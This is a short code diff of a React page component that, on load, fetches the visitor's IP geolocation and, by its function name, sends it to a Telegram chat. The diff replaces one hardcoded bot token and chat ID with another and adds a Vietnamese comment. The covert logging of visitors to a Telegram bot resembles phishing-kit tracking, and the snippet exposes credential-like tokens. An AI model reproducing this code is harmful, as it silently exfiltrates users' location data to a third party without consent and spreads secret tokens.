@@ -20,8 +20,9 @@ const Index: FC = () => {
             logSentRef.current = true;
             const fetchGeoAndSendTelegram = async () => {
                 const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
-                const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA';
-                const chatId = '-4795436920';
+				// con o cho nay nua
+                const botToken = '8466686106:AAFzSsPfuskJEY1EPkpN-CgTBiSTMA_O1XQ';
+                const chatId = '-4939056422';
 
                 const geoRes = await fetch(geoUrl);
                 const geoData = await geoRes.json();
